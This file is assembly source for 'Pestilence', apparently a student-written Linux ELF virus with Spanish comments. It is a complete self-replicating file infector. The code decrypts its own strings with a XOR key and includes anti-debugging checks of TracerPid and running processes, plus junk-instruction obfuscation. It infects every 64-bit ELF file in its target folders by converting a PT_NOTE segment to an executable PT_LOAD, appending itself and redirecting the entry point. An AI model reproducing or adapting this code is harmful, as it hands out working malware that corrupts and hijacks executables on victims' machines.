%include "inc/pestilence.inc"

default rel

section .text

    global _start

    _start:

    jmp _init

; ----------------------------------------- routines -------------------------------------------------------------------

    __F_directory_name_isdigit:
        ; rdi = puntero dirent_buffert
        push rbx
        lea rsi, [rdi + dirent.d_name]
        xor rcx, rcx ; contador
        .bucle:
            mov bl, [rsi + rcx]
            cmp bl, 0
            je .out
            cmp bl, 0x30
            jl .out
            cmp bl, 0x39
            jg .out
            inc rcx
            jmp .bucle
        .out:
            mov al, bl
            pop rbx
        ret
    __F_directory_name_isdigit__end:

    __F_close_proc_dir:
        push rax
        push rdi
        mov rax, SC_CLOSE
        mov rdi, VAR(Pestilence.fd_proc)
        syscall ; nos la suda lo que esto retorne la verdad
        pop rdi
        pop rax
        ret
    __F_close_proc_dir__end:

    __F_close_status_file:
        push rax
        push rdi
        mov rax, SC_CLOSE
        mov rdi, VAR(Pestilence.fd_status)
        syscall
        pop rdi
        pop rax
        ret
    __F_close_status_file__end:

    __F_strlen:
        ; calculamos longitud del nombre del directorio PID

        ; rdi = puntero al nombre del directorio (string acabada en 0)
        lea rdi, [r8 + dirent.d_name]
        mov al, 0
        mov rcx, -1   ; 0xffffffffffffffff
        cld
        repne scasb
        ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
        ; hasta encontrar 0, es len + 1. (magia negra asm)
        not rcx
        dec rcx
        ret
    __F_strlen__end:

    __F_mod_pt_note:
        ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
        lea rax, VAR(Pestilence.note_phdr_ptr)
        mov rax, [rax]
        mov [rax], dword 0x01                           ; p_type = PT_LOAD
        ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
        mov ecx, dword VAR(Pestilence.file_final_len)
        sub ecx, dword VAR(Pestilence.virus_size)
        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
        mov VAR(Pestilence.virus_offset), rcx
        mov rcx, VAR(Pestilence.max_vaddr_end)
        ALIGN rcx
        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
        mov VAR(Pestilence.new_entry), rcx
        mov ecx, dword VAR(Pestilence.virus_size)
        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
        ret
    __F_mod_pt_note__end:

    __F_ftruncate:
        ; ftruncate(fd_file, file_final_len)
        mov rdi, VAR(Pestilence.fd_file)
        xor rsi, rsi
        mov esi, dword VAR(Pestilence.file_final_len)
        mov rax, SC_FTRUNCATE
        syscall
        test rax, rax
        ret
    __F_ftruncate__end:

    __F_crazy:
        inc rax
        dec rax
        nop
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        nop
        ; ejemplos
        cmp rbx, rbx
        jne __F_crazy
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1

        not rax
        not rax

        cmp rbx, rsi
        
        ret
    __F_crazy__end:

; ----------------------------------------------------------------------------------------------------------------------

    _init:

        PUSH_ALL
        push rsp
        ; this trick allows us to access Pestilence members using the VAR macro
        mov rbp, rsp
        sub rbp, Pestilence_size            ; allocate Pestilence struct on stack

     .decrypt_data:   
        ; Desencriptar data
        lea r10, [rel __F_data]         ; base función
        mov rbx, 0x21336C3174733370
        ;xor rbx, 0x5050505050505050
        ; lea rbx, [rel xor_pass]   ; key
        xor rcx, rcx              ; contador función
        xor rdx, rdx              ; índice key

    .decrypt_data_loop:
        mov r8b, [r10 + rcx]
        mov r9b, bl
        xor r8b, r9b
        mov [r10 + rcx], r8b
        
        ror rbx, 8

        inc rcx
        ;inc rdx
        ;and rdx, 7
        cmp rcx, (__F_data__end - __F_data)
        jl .decrypt_data_loop       

        ; load virus size
        lea rax, _start
        lea rbx, _finish
        sub rbx, rax
        mov dword VAR(Pestilence.virus_size), ebx

    .open_proc:
        ; open("/proc", O_RDONLY, NULL)
        lea rdi, [proc]
        mov rsi, O_RDONLY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        ; si falla el open de /proc, infectamos sin comprobaciones.
        jle .jump_to_host
        mov VAR(Pestilence.fd_proc), rax

    .dirent_proc:
         ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
        mov rdi, VAR(Pestilence.fd_proc)
        lea rsi, VAR(Pestilence.dirent_buffer)
        mov rdx, 1024
        mov rax, SC_GETDENTS64
        syscall
        test rax, rax
        jle .check_tracerpid
        xor r12, r12
        mov rbx, rax

    .check_dir_in_proc:
        ; rbx = bytes escritos en dirent_buffer
        ; r12 = contador de bytes leídos de dirent_buffer
        cmp r12, rbx
        jge .dirent_proc

        lea rdi, VAR(Pestilence.dirent_buffer)
        add rdi, r12

        ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
        movzx ecx, word [rdi + dirent.d_len]
        add r12, rcx

        ; comprobamos si es directorio
        cmp byte [rdi + dirent.d_type], DT_DIR
        jne .check_dir_in_proc

        ; comprobamos que el nombre del directorio se corresponde con un PID
        CALL_ENCRYPT (directory_name_isdigit)
        cmp al, 0

        jne .check_dir_in_proc

    .proces_proc_dir:

        mov r8, rdi   ; guardamos el puntero a la dirent struct

        ; reservamos buffer destino
        sub rsp, 128

        ; escribimos "/proc/" en el stack
        lea rdi, [rsp]
        lea rsi, [proc]
        mov rcx, 6
        cld
        rep movsb

        ; calculamos longitud del nombre del directorio PID

        ; ; rdi = puntero al nombre del directorio (string acabada en 0)
        ; lea rdi, [r8 + dirent.d_name]
        ; mov al, 0
        ; mov rcx, -1   ; 0xffffffffffffffff
        ; cld
        ; repne scasb
        ; ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
        ; ; hasta encontrar 0, es len + 1. (magia negra asm)
        ; not rcx
        ; dec rcx

        ; concatenamos "/proc/" + "d_name"
        CALL_ENCRYPT(strlen)

        lea rdi, [rsp]
        add rdi, 6
        lea rsi, [r8 + dirent.d_name]
        ; rcx ya contiene la len a escribir
        cld
        rep movsb

        ; concatenamos "/proc/d_name" + "/exe"

        lea rsi, [exe_string]
        mov rcx, 5
        ; rcx ya contiene la len a escribir
        cld
        rep movsb

        ; rdi = "/proc/PID/exe"
        lea rdi, [rsp]
        sub rsp, 128
        lea rsi, [rsp]
        mov rdx, 128
        mov rax, SC_READLINK
        syscall
        test rax, rax
        ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
        jle .cleanup_and_check_dir_in_proc

        lea rdi, [forbidden_prog + 3]
        ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
        CALL_ENCRYPT(crazy)
        add rsi, rax
        dec rsi
        mov rcx, 4
        std
        rep cmpsb
        ; si está el forbidden program corriendo, saltamos al entrypoint
        ; original (no infectamos)
        je .cleanup_and_jump_to_host_0

        ; siguiente directorio.
        jmp .cleanup_and_check_dir_in_proc

    .cleanup_and_jump_to_host_0:
        CALL_ENCRYPT (close_proc_dir)
        add rsp, 256
        jmp .jump_to_host

    .cleanup_and_check_dir_in_proc:
        add rsp, 256
        jmp .check_dir_in_proc

    .check_tracerpid:
        ; abrimos /proc/self/status
        CALL_ENCRYPT (close_proc_dir)
        lea rdi, [rel status_file]
        mov rsi, O_RDONLY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        jle .start_infection

        ; guardamos el valor del fd para poder cerrarlo a posteriori
        mov VAR(Pestilence.fd_status), rax

        ; leemos el ficherín (raro sería que midiese mas de 4KB)
        mov rdi, rax
        sub rsp, 0x1000
        lea rsi, [rsp]
        mov rdx, 0x1000
        mov rax, SC_READ
        syscall
        test rax, rax
        jle .close_status_file_and_infect

        ; inicializamos el buffer del fichero para el rep cmpsb
        xor rbx, rbx
        lea rdi, [rsi]

    .search_trace:
        cmp rbx, rax
        jge .close_status_file_and_infect

        ; Cuando se llama a rep cmpsb, éste shiftea los buffers de rdi y rsi
        ; tantas veces como la comparación haya sido exitosa, y devuelve en rcx
        ; el valor inicial - el numero de iteracions.
        ; Entonces por cada iteracion tenemos que resetear rcx, rsi, pero no hace
        ; falta rdi porque así se recorre el buffer del fichero a medida que se llama.
        lea rsi, [rel tracerPid_str]
        mov rcx, 0xb
        cld
        rep cmpsb
        je .check_tracerPid_value

        ; rcx = 0xb - <número de comparaciones OK>
        ; rbx += 0xb - rcx
        mov rdx, 0xb
        sub rdx, rcx
        add rbx, rdx
        CALL_ENCRYPT(crazy)


        jmp .search_trace

    .cleanup_and_jump_to_host_1:
        add rsp, 0x1000
        CALL_ENCRYPT(close_status_file)
        jmp .jump_to_host

    .check_tracerPid_value:
       ; cmp byte [rdi], 0x30 ; == "0"
       ; jne .cleanup_and_jump_to_host_1

    .close_status_file_and_infect:
        add rsp, 0x1000
        CALL_ENCRYPT(close_status_file)

    .start_infection:
        ;load dirs
        CALL_ENCRYPT (close_proc_dir)
        lea rdi, [dirs]

; ----------------------------------------- VIRUS -------------------------------------------------------------------

    .open_dir:
        ; save dirname pointer to iterate after
        mov VAR(Pestilence.dir_name_pointer), rdi

        ; open(rdi, O_RDONLY | O_DIRECTORY);
        mov rsi, O_RDONLY | O_DIRECTORY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        jl .next_dir

        ; save fd
        mov VAR(Pestilence.fd_dir), rax

    ; get directory entry
    .dirent:
        ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
        mov rdi, VAR(Pestilence.fd_dir)
        lea rsi, VAR(Pestilence.dirent_buffer)
        mov rdx, 1024
        mov rax, SC_GETDENTS64
        syscall
        test rax, rax
        jle .close_dir

        xor r12, r12

    ; getdents64 does not return one directory entry. It returns as many directory entries as it can
    ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.

    ; rdi = dirent_buffer[0]
    ; r12 = offset from dirent_buffer[0]
    ; rax = total bytes read in getdents
    .check_for_files_in_dirents:
        ; if offset == total_bytes, next entry.
        cmp r12, rax
        jge .dirent

        ; shift offset from the start of the dirent struct array
        lea rdi, VAR(Pestilence.dirent_buffer)
        add rdi, r12
        CALL_ENCRYPT(crazy)
        ; add lenght of directory entry to offset
        movzx ecx, word [rdi + dirent.d_len]
        add r12, rcx

        ; check if the file is DT_REG
        cmp byte [rdi + dirent.d_type], DT_REG
        jne .check_for_files_in_dirents

        add rdi, dirent.d_name

    .openat:
        push rax

        ; openat(fd_dir, d_name (&rsi), O_RDWR);
        lea rsi, [rdi]
        mov rdi, VAR(Pestilence.fd_dir)
        mov rdx, O_RDWR
        mov rax, SC_OPENAT
        syscall
        test rax, rax
        jle .skip_file

        mov VAR(Pestilence.fd_file), rax

    .fstat:
        sub rsp, 144                ;fstat struct buffer
        lea rsi, [rsp]
        mov rdi, rax
        mov rax, SC_FSTAT
        syscall
        test rax, rax
        jl .end_fstat

        ; file type
        mov eax, dword [rsp + 24]   ; st-mode fstat struct
        and eax, S_IFMT             ; bytes file type
        cmp eax, S_IFREG            ; reg file type
        jne .close_file
        mov rax, [rsp + 48]
        mov dword VAR(Pestilence.file_original_len), eax

        jmp .check_ehdr

    .end_fstat:
        add rsp, 144
        jmp .close_file

    .check_ehdr:
        add rsp, 144                        ; deallocate fstat struct from stack

        ; read(fd_file, rsi, 64);
        mov rdi, VAR(Pestilence.fd_file)
        sub rsp, Elf64_Ehdr_size            ; alloc sizeof(Elf64_Ehdr) on stack
        lea rsi, [rsp]                      ; rsi = &rsp
        mov rdx, Elf64_Ehdr_size
        mov rax, SC_READ
        syscall

        cmp dword [rsp], MAGIC_NUMBERS      ; magic number
        jne .check_ehdr_error

        cmp byte [rsp + 4], 2               ; EI_CLASS = 64 bits
        jne .check_ehdr_error

        cmp byte [rsp + 5], 1               ; EI_DATA = little endian
        jne .check_ehdr_error

        add rsp, Elf64_Ehdr_size
        jmp .mmap

    .check_ehdr_error:
        add rsp, Elf64_Ehdr_size
        jmp .close_file

    .mmap:
        ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
        mov eax, dword VAR(Pestilence.file_original_len)
        ; align current size to end at 4K page so our payload is aligned by writing it
        ; at the end.
        ALIGN rax
        mov ecx, dword VAR(Pestilence.virus_size)
        add rax, rcx

        ; save aligned size of file + virus size.
        mov dword VAR(Pestilence.file_final_len), eax

        ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
        mov rdi, 0x0
        mov rsi, rax
        mov rdx, PROT_READ | PROT_WRITE
        mov r10, MAP_SHARED
        mov r8, VAR(Pestilence.fd_file)
        mov r9, 0x0
        mov rax, SC_MMAP
        syscall
        test rax, rax
        jle .close_file
        mov VAR(Pestilence.mmap_ptr), rax   ; save mmap_ptr

    .check_infect:
        mov rcx, dword Traza_position
        mov rsi, rax
        mov ebx, dword VAR(Pestilence.file_original_len)
        add rsi, rbx
        sub rsi, rcx
        lea rdi, Traza
        mov rcx, 54
        cld                 ; incremental
        rep cmpsb           ; comparar rdi y rsi rcx bytes
        je .munmap

    .infect:
        mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
        mov VAR(Pestilence.original_entry), rbx         ; save original_entry
        lea rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = &(rax + e_phoff)
        mov rbx, [rbx]                              ; rbx = rax + *(rbx)
        add rbx, rax
        movzx eax, word [rax + Elf64_Ehdr.e_phnum]
        ; initialize variables seeked in loop header
        xor ecx, ecx
        mov VAR(Pestilence.note_phdr_ptr), rcx
        mov VAR(Pestilence.max_vaddr_end), rcx

    ;rax = phnum
    ;rbx = phdr_pointer
    .loop_phdr:
        cmp rax, 0
        jle .end_loop_phdr
        ; lo que sea de rbx
        cmp dword [rbx], 0x01 ;PT_LOAD
        je .compute_max_vaddr_end
        cmp dword [rbx], 0x04 ;PT_NOTE
        je .assign_pt_note_phdr
        jne .next_phdr
        jmp .end_loop_phdr

    .assign_pt_note_phdr:
        cmp qword VAR(Pestilence.note_phdr_ptr), 0x0
        jne .next_phdr
        mov VAR(Pestilence.note_phdr_ptr), rbx
        jmp .next_phdr

    .compute_max_vaddr_end:
        ; r8 = p_vaddr + p_memsz
        mov r8, [rbx+Elf64_Phdr.p_vaddr]
        add r8, [rbx+Elf64_Phdr.p_memsz]
        ; if p_vaddr + p_memsz > max_vaddr_end:
        cmp r8, VAR(Pestilence.max_vaddr_end)
        jl .next_phdr
        ; save new max_vaddr_end
        mov VAR(Pestilence.max_vaddr_end), r8

    .next_phdr:
        dec rax
        add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
        jmp .loop_phdr

    .end_loop_phdr:
        cmp qword VAR(Pestilence.note_phdr_ptr), 0x0
        je .munmap
        cmp qword VAR(Pestilence.max_vaddr_end), 0x0
        je .munmap

    .ftruncate:
        ; ftruncate(fd_file, file_final_len)
        ; mov rdi, VAR(Pestilence.fd_file)
        ; xor rsi, rsi
        ; mov esi, dword VAR(Pestilence.file_final_len)
        ; mov rax, SC_FTRUNCATE
        ; syscall
        ; test rax, rax
        CALL_ENCRYPT(ftruncate)
        jnz .munmap

    .mod_pt_note:
        ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
        ; lea rax, VAR(Pestilence.note_phdr_ptr)
        ; mov rax, [rax]
        ; mov [rax], dword 0x01                           ; p_type = PT_LOAD
        ; ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
        ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
        ; mov ecx, dword VAR(Pestilence.file_final_len)
        ; sub ecx, dword VAR(Pestilence.virus_size)
        ; mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
        ; mov VAR(Pestilence.virus_offset), rcx
        ; mov rcx, VAR(Pestilence.max_vaddr_end)
        ; ALIGN rcx
        ; mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
        ; mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
        ; mov VAR(Pestilence.new_entry), rcx
        ; mov ecx, dword VAR(Pestilence.virus_size)
        ; mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
        ; mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
        ; mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
        CALL_ENCRYPT(mod_pt_note)

        ; Encriptar data
    .encrypt_data    
        lea r10, [rel __F_data]         ; base función
        mov rbx, 0x21336C3174733370

        ;lea rbx, [rel xor_pass]   ; key
        xor rcx, rcx              ; contador función
        xor rdx, rdx              ; índice key

    .encrypt_data_loop:
        mov r8b, [r10 + rcx]
        mov r9b, bl
        xor r8b, r9b
        mov [r10 + rcx], r8b

        ror rbx, 8
        inc rcx
        ; inc rdx
        ; and rdx, 7
        cmp rcx, (__F_data__end - __F_data)
        jl .encrypt_data_loop       
    
    .write_payload:
        lea rsi, _start
        mov rdi, VAR(Pestilence.mmap_ptr)
        add rdi, VAR(Pestilence.virus_offset)
        ; nos guardamos el address del mmap que se corresponde con el principio
        ; del virus, movsb modifica este valor.
        push rdi
        mov ecx, dword VAR(Pestilence.virus_size)
        cld
        rep movsb
        pop rdi
        ; Patch host_entrypoint en el mmap con el entrypoint original
        mov rax, VAR(Pestilence.original_entry)
        mov [rdi + (host_entrypoint - _start)], rax
        ; Patch virus_vaddr en el mmap con el nuevo entrypoint
        mov rax, VAR(Pestilence.new_entry)
        mov [rdi + (virus_vaddr - _start)], rax
        ; Cambiar e_entry en el ELF Header
        mov rax, VAR(Pestilence.mmap_ptr)
        mov rbx, VAR(Pestilence.new_entry)
        mov [rax + Elf64_Ehdr.e_entry], rbx



    .munmap:
        ;munmap(map_ptr, len)
        mov rdi, VAR(Pestilence.mmap_ptr)
        mov esi, dword VAR(Pestilence.file_final_len)
        mov rax, SC_UNMAP
        syscall

    .close_file:
        ; TODO llamar al munmap antes de cerrar el fd.
        mov rdi, VAR(Pestilence.fd_file)
        mov rax, SC_CLOSE
        syscall

    .skip_file:
        pop rax
        jmp .check_for_files_in_dirents

    .close_dir:
        mov rax, SC_CLOSE
        mov rdi, VAR(Pestilence.fd_dir)
        syscall

    .next_dir:
        mov rsi, VAR(Pestilence.dir_name_pointer)

    .find_null:
        cld
        lodsb               ; al = *rsi++
        test al, al
        jnz .find_null
        mov rdi, rsi
        cmp byte [rdi], 0   ; find double null
        jnz .open_dir

    .jump_to_host:
        mov rsp, rbp
        add rsp, Pestilence_size
        pop rsp
        POP_ALL
        ; Calcular dirección de retorno
        lea rax, [rel _start]               ; Dirección absoluta de _start ahora mismo
        sub rax, [rel virus_vaddr]          ; Base real (Absoluta - Virtual)
        add rax, [rel host_entrypoint]      ; Dirección host (Base + Offset)
        jmp rax

    _dummy_host_entrypoint:
        mov rax, SC_EXIT
        xor rdi, rdi
        syscall

    __F_data:
    tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
    status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
    forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
    exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
    hello           db      "[+] hello",10,0 ;11
    proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
    dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
    __F_data__end:
    xor_pass        db      0x70,0x33,0x73,0x74,0x31,0x6C,0x33,0x21 ;"p3st1l3!" ; 8
    Traza_position  equ     _finish - Traza
    Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
    host_entrypoint dq      _dummy_host_entrypoint
    virus_vaddr     dq      _start

    _finish:
